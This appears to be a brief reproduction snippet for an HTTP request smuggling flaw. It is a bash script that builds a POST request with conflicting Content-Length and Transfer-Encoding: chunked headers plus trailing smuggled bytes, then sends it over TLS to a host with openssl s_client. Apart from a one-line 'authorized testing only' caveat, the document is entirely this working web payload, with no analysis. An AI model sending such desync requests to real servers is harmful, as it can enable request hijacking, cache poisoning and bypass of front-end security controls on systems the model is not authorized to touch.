# Reproduce with openssl

> For authorized testing only.

```bash
HOST=example.com
PORT=443
REQ=$'POST / HTTP/1.1\r\nHost: '"$HOST"$'\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n0\r\n\r\nX=1'
printf "%b" "$REQ" | openssl s_client -quiet -connect "$HOST:$PORT"
